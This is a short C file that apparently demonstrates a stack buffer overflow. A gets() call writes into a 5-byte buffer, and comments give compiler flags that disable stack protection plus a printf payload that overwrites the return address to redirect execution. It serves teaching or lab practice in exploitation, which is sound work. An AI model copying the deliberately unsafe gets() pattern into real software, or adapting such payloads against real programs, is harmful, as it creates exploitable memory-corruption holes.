#include <stdio.h>
#include <stdlib.h>

void unused(){
    printf("unused\n");
}

void getInput(){
    char buf[5];
    gets(buf);
    puts(buf);
}

int main(){
    getInput();
    return 0;
}
//apt-get install execstack
//gcc -fno-stack-protector -z execstack -g smash.c
//printf "1234512345678\xf0\x06\x55\x55\x55\x55\x00\x00"|./a.out
